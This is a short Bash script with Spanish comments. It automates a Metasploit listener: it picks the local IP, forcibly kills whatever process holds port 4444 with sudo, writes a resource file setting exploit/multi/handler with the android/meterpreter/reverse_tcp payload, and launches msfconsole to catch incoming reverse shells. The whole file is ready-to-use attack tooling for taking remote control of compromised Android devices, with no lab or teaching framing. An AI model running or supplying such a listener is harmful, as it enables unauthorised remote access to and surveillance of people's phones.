#!/bin/bash

# Función para mostrar el uso del script
usage() {
    echo "Uso: $0 [-ip <IP_ADDRESS>]"
    exit 1
}

# Inicializar la variable LOCAL_IP
LOCAL_IP=""
PORT=""

# Procesar argumentos de línea de comandos
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -ip) LOCAL_IP="$2"; shift ;;
        -port) PORT="$2"; shift ;;
        -h|--help) usage ;;
        *) usage ;;
    esac
    shift
done

# Si no se proporcionó una IP, intentar obtener la IP local
if [[ -z "$LOCAL_IP" ]]; then
    LOCAL_IP=$(hostname -I | awk '{print $1}')
fi

# Verificar si la IP es válida
if [[ -z "$LOCAL_IP" ]]; then
    echo -e "\e[31mNo se pudo obtener la IP local y no se proporcionó una IP válida.\e[0m"
    usage
fi

# Si no se proporcionó un puerto, usar un valor predeterminado
if [[ -z "$PORT" ]]; then
    # Eliminamos los procesos que estén utilizando el puerto 4444
    sudo fuser -k 4444/tcp &>/dev/null
    PORT=4444
fi

# Verificamos si el puerto es válido
if [[ ! "$PORT" =~ ^[0-9]+$ ]]; then
    echo -e "\e[31mEl puerto no es válido.\e[0m"
    usage
fi

# Generar el archivo config.rc con la IP local
cat <<EOL > config.rc
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $LOCAL_IP
set LPORT $PORT
exploit
EOL

# Ejecutar Metasploit con el archivo config.rc
msfconsole -r config.rc